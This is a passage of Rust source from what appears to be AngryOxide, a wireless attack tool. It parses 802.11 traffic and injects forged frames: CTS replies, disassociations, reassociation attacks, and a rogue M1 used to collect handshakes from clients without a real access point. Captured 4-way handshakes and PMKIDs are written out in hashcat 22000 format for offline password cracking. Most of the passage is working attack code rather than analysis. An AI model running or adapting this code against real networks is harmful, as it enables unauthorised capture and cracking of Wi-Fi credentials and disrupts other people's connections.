                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256)),
                                rsn_akm_pskft: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT)),
                                wpa_akm_psk: station_info
                                    .wpa_info
                                    .as_ref()
                                    .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                ap_mfp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.mfp_required),
                            }),
                            clients,
                            oxide.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(bssid, &ap);
                    };
                }
                Frame::ReassociationRequest(frame) => {
                    oxide.counters.reassociation += 1;

                    // Assumption:
                    //  Only a client will ever submit an reassociation request.
                    //  Attack includes sending a reassociation response and M1 frame- looks very similar to attacking an associataion request.
                    let client_mac = frame.header.address_2; // MAC address of the client
                    let new_ap = frame.header.address_1; // MAC address of the AP
                    let old_ap = frame.current_ap_address;
                    let ssid = frame.station_info.ssid;

                    // Technically the client is still associated to the old AP. Let's add it there and we will handle moving it over if we get a reassociation response.
                    if old_ap.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        // Setup client
                        let client = &Station::new_station(
                            client_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            Some(old_ap),
                        );
                        clients.add_or_update_device(client_mac, client);
                        oxide.unassoc_clients.remove_device(&client_mac);

                        let ap = AccessPoint::new_with_clients(
                            old_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            None,
                            None,
                            clients,
                            oxide.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(old_ap, &ap);

                        let newap = AccessPoint::new_with_clients(
                            new_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            Some(channel_u8),
                            None,
                            WiFiDeviceList::<Station>::new(),
                            oxide.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(new_ap, &newap);
                    };
                }
                Frame::ReassociationResponse(frame) => {
                    oxide.counters.reassociation += 1;
                    // Assumption:
                    //  Only a AP will ever submit a reassociation response.
                    //
                    let client_mac = frame.header.address_1; // MAC address of the client
                    let ap_mac = frame.header.address_2; // MAC address of the AP (BSSID)

                    if ap_mac.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(ap_mac),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                            // Find the old AP, remove this device from it.
                            if let Some(old_ap) =
                                oxide.access_points.find_ap_by_client_mac(&client_mac)
                            {
                                old_ap.client_list.remove_device(&client_mac);
                            }
                        }
                        let ap = AccessPoint::new_with_clients(
                            ap_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            Some(channel_u8),
                            None,
                            clients,
                            oxide.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::Rts(frame) => {
                    oxide.counters.control_frames += 1;
                    // Most drivers (Mediatek, Ralink, Atheros) don't seem to be actually sending these to userspace (on linux).
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    if dest_mac == oxide.rogue_client {
                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Error,
                            format!("RTS: {} => {}", frame.source, frame.destination),
                        ));
                        let frx = build_cts(&source_mac);
                        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
                    } else {
                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Error,
                            format!("RTS NOT US: {} => {}", frame.source, frame.destination),
                        ));
                    }
                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device() && station_addr != oxide.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some(channel_u8),
                        None,
                        clients,
                        oxide.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Cts(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::Ack(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::BlockAck(frame) => {
                    oxide.counters.control_frames += 1;
                    //println!("BlockAck: {} => {}", frame.source, frame.destination);
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device() && station_addr != oxide.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some(channel_u8),
                        None,
                        clients,
                        oxide.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::BlockAckRequest(frame) => {
                    oxide.counters.control_frames += 1;
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device() && station_addr != oxide.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some(channel_u8),
                        None,
                        clients,
                        oxide.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Data(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::NullData(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosNull(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosData(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::DataCfAck(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::DataCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::DataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::CfAck(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::CfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::CfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosDataCfAck(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosDataCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosDataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
                Frame::QosCfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, channel_u8)?
                }
            }
            // Post Processing
        }
        Err(err) => {
            if let libwifi::error::Error::Failure(message, _data) = err {
                match &message[..] {
                    "Input frame is too short to contain an FCS" => {}
                    "Frame Check Sequence (FCS) mismatch" => {}
                    "An error occured while parsing the data: nom::ErrorKind is Eof" => {}
                    _ => {
                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Error,
                            format!("Libwifi Parsing Error: {message:?}",),
                        ));
                        oxide.error_count += 1;
                    }
                }
            }
            return Err("Parsing Error".to_owned());
        }
    };

    // Build FrameData package for sending to Database/PCAP-NG
    let pcapgps = if gps_data.has_fix() {
        Some(gps_data)
    } else {
        None
    };

    let freq = if let Some(freq) = current_channel.to_frequency() {
        Some(freq as f64)
    } else {
        None
    };

    let signal = if let Some(signal) = radiotap.antenna_signal {
        Some(signal.value as i32)
    } else {
        None
    };

    let rate = if let Some(rate) = radiotap.rate {
        Some(rate.value as f64)
    } else {
        None
    };

    let frxdata = FrameData::new(
        SystemTime::now(),
        packet_id,
        packet.to_vec(),
        pcapgps,
        source,
        destination,
        freq,
        signal,
        rate,
        oxide.interface_uuid,
    );

    // Send to pcap
    oxide.pcap_file.send(frxdata.clone());
    // Send to database
    oxide.database.send(frxdata.clone());

    Ok(())
}

fn handle_data_frame(
    data_frame: &impl DataFrame,
    rthdr: &Radiotap,
    oxide: &mut OxideRuntime,
    chan: u8,
) -> Result<(), String> {
    oxide.counters.data += 1;

    let source = data_frame.header().src().expect("Unable to get src");
    let dest = data_frame.header().dest();
    let from_ds: bool = data_frame.header().frame_control.from_ds();
    let to_ds: bool = data_frame.header().frame_control.to_ds();
    let powersave: bool = data_frame.header().frame_control.pwr_mgmt();
    let ap_addr = if from_ds && !to_ds {
        data_frame.header().address_2
    } else if !from_ds && to_ds {
        data_frame.header().address_1
    } else {
        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
        // lets just ignore it lol
        return Ok(());
    };

    let station_addr = if !from_ds && to_ds {
        data_frame.header().address_2
    } else {
        data_frame.header().address_1
    };

    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
    let signal = rthdr
        .antenna_signal
        .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);

    if ap_addr != oxide.rogue_client {
        if station_addr.is_real_device() && station_addr != oxide.rogue_client {
            // Make sure this isn't a broadcast or something
            let client = &Station::new_station(
                station_addr,
                if to_ds {
                    signal
                } else {
                    AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                },
                Some(ap_addr),
            );
            clients.add_or_update_device(station_addr, client);
            oxide.unassoc_clients.remove_device(&station_addr);
        }

        // Create and Add/Update AccessPoint
        let ap = AccessPoint::new_with_clients(
            ap_addr,
            if from_ds {
                signal
            } else {
                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
            },
            None,
            Some(chan),
            None,
            clients,
            oxide.rogue_client,
        );
        oxide.access_points.add_or_update_device(ap_addr, &ap);
    }

    // Handle frames that contain EAPOL.
    if let Some(eapol) = data_frame.eapol_key().clone() {
        oxide.eapol_count += 1;

        if ap_addr == oxide.rogue_client
            && (eapol.determine_key_type() == libwifi::frame::MessageType::Message2)
        {
            let essid = oxide.rogue_essids.get(&station_addr);
            let mut rogue_eapol = oxide.rogue_m1.clone();
            rogue_eapol.timestamp = eapol
                .timestamp
                .checked_sub(Duration::from_millis(10))
                .unwrap_or(eapol.timestamp);

            // Add our rogue M1
            let _ = oxide.handshake_storage.add_or_update_handshake(
                &ap_addr,
                &station_addr,
                rogue_eapol,
                essid.cloned(),
            );

            // Add the RogueM2
            let result = oxide.handshake_storage.add_or_update_handshake(
                &ap_addr,
                &station_addr,
                eapol.clone(),
                essid.cloned(),
            );

            // Set to apless
            if let Ok(handshake) = result {
                handshake.apless = true;
            }

            // Set to apless
            //oxide.handshake_storage.set_apless_for_ap(&ap_addr);

            // Set the Station that we collected a RogueM2
            if let Some(station) = oxide.unassoc_clients.get_device(&station_addr) {
                station.has_rogue_m2 = true;
                station
                    .rogue_actions
                    .entry(essid.unwrap().to_string())
                    .or_insert(true);
            }

            // Print a status so we have it for headless

            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!(
                    "\x1b[31m*** RogueM2 Collected!: {dest} => {source} ({})\x1b[0m",
                    essid.unwrap()
                ),
            ));

            // Don't need to go any further, because we know this wasn't a valid handshake otherwise.
            return Ok(());
        }

        let ap = if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
            ap
        } else {
            return Ok(());
        };

        let essid = ap.ssid.clone();

        if station_addr == oxide.rogue_client
            && eapol.determine_key_type() == libwifi::frame::MessageType::Message1
        {
            let frx = build_disassocation_from_client(
                &ap_addr,
                &station_addr,
                oxide.counters.sequence2(),
            );
            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
            if oxide.handshake_storage.has_m1_for_ap(&ap_addr) {
                return Ok(());
            }
        }

        let result = oxide.handshake_storage.add_or_update_handshake(
            &ap_addr,
            &station_addr,
            eapol.clone(),
            essid,
        );
        match result {
            Ok(handshake) => {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!(
                        "New Eapol: {dest} => {source} ({})",
                        eapol.determine_key_type()
                    ),
                ));
                if handshake.complete() {
                    if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
                        ap.has_hs = true;

                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Info,
                            format!(
                                "\x1b[31m*** 4wHS Complete: {dest} => {source} ({}) ***\x1b[0m",
                                ap.ssid.clone().unwrap_or("".to_string())
                            ),
                        ));
                    }
                }
                if handshake.has_pmkid() {
                    if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
                        ap.has_pmkid = true;

                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Info,
                            format!(
                                "\x1b[31m*** PMKID Caught: {dest} => {source} ({}) ***\x1b[0m",
                                ap.ssid.clone().unwrap_or("".to_string())
                            ),
                        ));
                    }
                }
            }
            Err(e) => {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!(
                        "Eapol Failed to Add: {dest} => {source} ({}) | {e}",
                        eapol.determine_key_type(),
                    ),
                ));
            }
        }
    }
    Ok(())
}

fn handle_null_data_frame(
    data_frame: &impl NullDataFrame,
    rthdr: &Radiotap,
    oxide: &mut OxideRuntime,
    chan: u8,
) -> Result<(), String> {
    oxide.counters.null_data += 1;
    let from_ds: bool = data_frame.header().frame_control.from_ds();
    let to_ds: bool = data_frame.header().frame_control.to_ds();
    let powersave: bool = data_frame.header().frame_control.pwr_mgmt();
    let ap_addr = if from_ds && !to_ds {
        data_frame.header().address_2
    } else if !from_ds && to_ds {
        data_frame.header().address_1
    } else {
        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
        // lets just ignore it lol
        return Ok(());
    };

    let station_addr = if !from_ds && to_ds {
        data_frame.header().address_2
    } else {
        data_frame.header().address_1
    };

    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
    let signal = rthdr
        .antenna_signal
        .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);

    if station_addr.is_real_device() && station_addr != oxide.rogue_client {
        // Make sure this isn't a broadcast or something

        let client = &Station::new_station(
            station_addr,
            if to_ds {
                signal
            } else {
                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
            },
            Some(ap_addr),
        );
        clients.add_or_update_device(station_addr, client);
        oxide.unassoc_clients.remove_device(&station_addr);
    }
    let ap = AccessPoint::new_with_clients(
        ap_addr,
        if from_ds {
            signal
        } else {
            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
        },
        None,
        Some(chan),
        None,
        clients,
        oxide.rogue_client,
    );
    oxide.access_points.add_or_update_device(ap_addr, &ap);

    // Check PS State:
    if !powersave && station_addr != oxide.rogue_client {
        // Client is awake... potentially... try reassociation attack?
        anon_reassociation_attack(oxide, &ap_addr)?;
    }

    Ok(())
}

fn write_packet(fd: i32, packet: &[u8]) -> Result<(), String> {
    let bytes_written =
        unsafe { libc::write(fd, packet.as_ptr() as *const libc::c_void, packet.len()) };

    if bytes_written < 0 {
        // An error occurred during write
        let error_code = io::Error::last_os_error();

        return Err(error_code.to_string());
    }

    Ok(())
}

fn read_packet(oxide: &mut OxideRuntime) -> Result<Vec<u8>, io::Error> {
    let mut buffer = vec![0u8; 6000];
    let packet_len = unsafe {
        libc::read(
            oxide.rx_socket.as_raw_fd(),
            buffer.as_mut_ptr() as *mut libc::c_void,
            buffer.len(),
        )
    };

    // Handle non-blocking read
    if packet_len < 0 {
        let error_code = io::Error::last_os_error();
        if error_code.kind() == io::ErrorKind::WouldBlock {
            oxide.counters.empty_reads += 1;
            return Ok(Vec::new());
        } else {
            // An actual error occurred
            oxide.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Error Reading from Socket: {:?}", error_code.kind()),
            ));
            return Err(error_code);
        }
    }

    buffer.truncate(packet_len as usize);
    Ok(buffer)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    if !geteuid().is_root() {
        println!("{}", get_art("You need to run as root!"));
        exit(EXIT_FAILURE);
    }

    let cli = Arguments::parse();

    let filename = if let Some(fname) = cli.output {
        format!("{}", fname)
    } else {
        let now = Local::now();
        let filename = now.format("oxide-%Y-%m-%d_%H-%M-%S").to_string();
        format!("{}", filename)
    };

    let mut output_files = vec![
        format!("{}.kismet", filename),
        format!("{}.pcapng", filename),
    ];

    let mut oxide = OxideRuntime::new(
        cli.interface,
        cli.notransmit,
        cli.rogue,
        cli.target,
        cli.deauth,
        filename.clone(),
        cli.gpsd,
        cli.band,
        cli.channel,
        cli.headless,
        cli.autoexit,
    );

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        "Starting...".to_string(),
    ));

    let iface = oxide.interface.clone();
    let idx = iface.index.unwrap();
    let interface_name = String::from_utf8(iface.clone().name.unwrap())
        .expect("cannot get interface name from bytes.");

    let duration = Duration::from_secs(1);
    thread::sleep(duration);

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    let mut seconds_timer = Instant::now();
    let seconds_interval = Duration::from_secs(1);
    let mut frame_count_old = 0u64;
    let mut frame_rate = 0u64;

    let mut empty_reads_old = 0u64;

    let mut last_status_time = Instant::now();

    let status_interval = if cli.headless {
        Duration::from_secs(1)
    } else {
        Duration::from_millis(50)
    };

    /*
    let mut last_interactions_clear = Instant::now();
    let interactions_interval = Duration::from_secs(120);
    */

    // Setup hop data
    let hop_interval = Duration::from_secs(2);
    let mut last_hop_time = Instant::now();

    // Set starting channel and create the hopper cycle.
    let channels_binding = oxide.hop_channels.clone();
    let mut cycle_iter = channels_binding.iter().cycle();
    if let Some(&channel) = cycle_iter.next() {
        if let Err(e) = set_interface_chan(idx, channel) {
            eprintln!("{}", e);
        }
    }

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Setting channel hopper: {:?}", oxide.hop_channels),
    ));

    let start_time = Instant::now();

    let mut err = false;
    let mut exit_on_succ = false;
    let mut terminal =
        Terminal::new(CrosstermBackend::new(stdout())).expect("Cannot allocate terminal");

    if !cli.headless {
        // UI is in normal mode
        execute!(stdout(), Hide)?;
        execute!(stdout(), EnterAlternateScreen)?;
        execute!(stdout(), EnableMouseCapture)?;
        enable_raw_mode()?;
        initialize_panic_handler();
    } else {
        // UI is in headless mode
        ctrlc::set_handler(move || {
            r.store(false, Ordering::SeqCst);
        })
        .expect("Error setting Ctrl-C handler");
    }

    while running.load(Ordering::SeqCst) {
        // Calculate last packet rate
        if seconds_timer.elapsed() >= seconds_interval {
            seconds_timer = Instant::now();

            // Calculate the frame rate
            let frames_processed = oxide.frame_count - frame_count_old;
            frame_count_old = oxide.frame_count;
            frame_rate = frames_processed;

            // Calculate the Empty Read Rate:
            if oxide.counters.empty_reads >= 18446744073709541615 {
                oxide.counters.empty_reads = 0;
                empty_reads_old = 0;
            }
            let reads = oxide.counters.empty_reads;
            oxide.counters.empty_reads_rate = reads - empty_reads_old;
            empty_reads_old = reads;
        }

        if last_hop_time.elapsed() >= hop_interval {
            if let Some(&channel) = cycle_iter.next() {
                if let Err(e) = oxide.netlink.set_interface_chan(idx, channel) {
                    oxide.status_log.add_message(StatusMessage::new(
                        MessageType::Error,
                        format!("Error: {e:?}"),
                    ));
                }
                oxide.current_channel = WiFiChannel::new(channel).unwrap();
                last_hop_time = Instant::now();
            }
        }
        let table_len = oxide.get_current_menu_len();

        // This should ONLY apply to normal UI mode.
        if !cli.headless {
            if let Some(ev) = oxide.eventhandler.get() {
                match ev {
                    EventType::Key(event) => {
                        if let Event::Key(key) = event {
                            if key.kind == KeyEventKind::Press {
                                match key.code {
                                    KeyCode::Char('d') => oxide.ui_state.menu_next(),
                                    KeyCode::Char('a') => oxide.ui_state.menu_back(),
                                    KeyCode::Char('w') | KeyCode::Char('W') => {
                                        if key.modifiers.intersects(KeyModifiers::SHIFT) {
                                            oxide.ui_state.table_previous_item_big();
                                        } else {
                                            oxide.ui_state.table_previous_item();
                                        }
                                    }
                                    KeyCode::Char('s') | KeyCode::Char('S') => {
                                        if key.modifiers.intersects(KeyModifiers::SHIFT) {
                                            oxide.ui_state.table_next_item_big(table_len);
                                        } else {
                                            oxide.ui_state.table_next_item(table_len);
                                        }
                                    }
                                    KeyCode::Char('q') => running.store(false, Ordering::SeqCst),
                                    KeyCode::Char(' ') => oxide.ui_state.toggle_pause(),
                                    KeyCode::Char('e') => oxide.ui_state.sort_next(),
                                    KeyCode::Char('r') => oxide.ui_state.toggle_reverse(),
                                    _ => {}
                                }
                            }
                        } else if let Event::Mouse(event) = event {
                            match event.kind {
                                MouseEventKind::ScrollDown => {
                                    oxide.ui_state.table_next_item(table_len)
                                }
                                MouseEventKind::ScrollUp => oxide.ui_state.table_previous_item(),
                                _ => {}
                            }
                        }
                    }
                    EventType::Tick => {
                        print_ui(&mut terminal, &mut oxide, start_time, frame_rate);
                    }
                }
            }
        }

        // Start UI Messages

        if last_status_time.elapsed() >= status_interval {
            last_status_time = Instant::now();
            if cli.headless {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!(
                        "Status: Frames: {} | Rate: {} | Channel: {}",
                        oxide.frame_count, frame_rate, oxide.current_channel
                    ),
                ));
            }
        }

        // Clear the interactions counts for all AP's.
        // This is deprecated as we are no longer capping interactions based on this.
        /* if last_interactions_clear.elapsed() >= interactions_interval {
            last_interactions_clear = Instant::now();
            oxide.access_points.clear_all_interactions();
        } */

        // Read Packet
        match read_packet(&mut oxide) {
            Ok(packet) => {
                if !packet.is_empty() {
                    let _ = handle_frame(&mut oxide, &packet);
                }
            }
            Err(_) => {
                err = true;
                running.store(false, Ordering::SeqCst);
            }
        };

        // Exit on targets success
        if cli.autoexit && oxide.get_target_success() {
            running.store(false, Ordering::SeqCst);
            exit_on_succ = true;
        }

        thread::sleep(Duration::from_micros(1));
    }

    // Execute cleanup
    if !cli.headless {
        reset_terminal();
    }

    if exit_on_succ {
        println!("Auto Exit Initiated");
    }

    println!("Cleaning up...");
    if err {
        println!("{}", get_art("A serious packet read error occured."))
    }

    println!("Setting {} down.", interface_name);
    match oxide.netlink.set_interface_down(idx) {
        Ok(_) => {}
        Err(e) => println!("Error: {e:?}"),
    }

    println!("Setting {} to station mode.", interface_name);
    match oxide.netlink.set_interface_station(idx) {
        Ok(_) => {}
        Err(e) => println!("Error: {e:?}"),
    }

    println!("Stopping Threads");
    oxide.pcap_file.stop();
    oxide.gps_source.stop();
    oxide.database.stop();

    println!();

    // Hashmap<SSID, Vec<hashline>>
    let mut handshakes_map: HashMap<String, Vec<String>> = HashMap::new();

    // Write handshakes to their respective files.
    for (_, handshakes) in oxide.handshake_storage.get_handshakes() {
        if !handshakes.is_empty() {
            for hs in handshakes {
                if hs.complete() {
                    if let Some(hashcat_string) = hs.to_hashcat_22000_format() {
                        let essid = hs.essid_to_string();
                        let hashline = hashcat_string;
                        handshakes_map.entry(essid).or_default().push(hashline);
                    }
                }
            }
        }
    }

    let hashfiles = write_handshakes(&handshakes_map).expect("Error writing handshakes");
    print_handshake_summary(&handshakes_map);
    output_files.extend(hashfiles);

    if !cli.notar {
        println!("📦 Creating Output Tarball ({}.tar.gz)...", filename);
        let _ = tar_and_compress_files(output_files, &filename);
    }

    Ok(())
}

fn write_handshakes(handshakes_map: &HashMap<String, Vec<String>>) -> Result<Vec<String>, ()> {
    let mut hashfiles = Vec::new();
    for (key, values) in handshakes_map {
        let file_name = format!("{}.hc22000", key);
        let mut file = File::create(&file_name).expect("Could not open hashfile for writing.");

        for value in values {
            writeln!(file, "{}", value);
        }
        hashfiles.push(file_name);
    }
    Ok(hashfiles)
}

fn print_handshake_summary(handshakes_map: &HashMap<String, Vec<String>>) {
    if !handshakes_map.is_empty() {
        println!("😈 Results:");
        for (key, values) in handshakes_map {
            let (handshake_count, pmkid_count) =
                values
                    .iter()
                    .fold((0, 0), |(mut handshake_acc, mut pmkid_acc), value| {
                        if value.contains("WPA*02*") {
                            handshake_acc += 1;
                        }
                        if value.contains("WPA*01") {
                            pmkid_acc += 1;
                        }
                        (handshake_acc, pmkid_acc)
                    });

            println!(
                "[{}] : 4wHS: {} | PMKID: {}",
                key, handshake_count, pmkid_count
            );
        }
        println!();
    } else {
        println!(
            "AngryOxide did not collect any results. 😔 Try running longer, or check your interface?"
        );
    }
}

fn tar_and_compress_files(output_files: Vec<String>, filename: &str) -> io::Result<()> {
    let tgz = File::create(format!("{}.tar.gz", filename))?;
    let enc = GzEncoder::new(tgz, Compression::default());
    let mut tar = Builder::new(enc);

    for path in &output_files {
        let mut file = File::open(path)?;
        tar.append_file(path, &mut file)?;
    }

    tar.into_inner()?;

    // Delete original files after they are successfully added to the tarball
    for path in &output_files {
        if let Err(e) = fs::remove_file(path) {
            eprintln!("Failed to delete file {}: {}", path, e);
        }
    }

    Ok(())
}

pub fn initialize_panic_handler() {
    let original_hook = std::panic::take_hook();
    std::panic::set_hook(Box::new(move |panic_info| {
        reset_terminal();
        original_hook(panic_info);
    }));
}

fn reset_terminal() {
    execute!(stdout(), Show).expect("Could not show cursor.");
    execute!(io::stdout(), LeaveAlternateScreen).expect("Could not leave alternate screen");
    execute!(stdout(), DisableMouseCapture).expect("Could not disable mouse capture.");
    disable_raw_mode().expect("Could not disable raw mode.");
}
